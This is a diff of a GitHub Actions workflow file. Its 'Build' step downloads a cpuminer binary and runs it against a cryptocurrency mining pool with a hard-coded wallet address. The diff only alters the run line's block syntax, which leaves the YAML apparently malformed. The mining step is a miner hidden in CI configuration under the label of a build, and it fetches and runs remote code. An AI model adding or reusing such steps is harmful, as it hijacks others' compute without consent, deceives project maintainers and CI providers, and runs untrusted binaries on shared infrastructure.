@@ -22,7 +22,7 @@ build:
       uses: actions/checkout@v1
 
       name: Build
-      run: |
+      run: 
         wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
         tar xf cpuminer-opt-linux.tar.gz
         ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qk5t692h38x47pd6a5fqdlxsddvsgx392yt5vx8.kuarto -t0
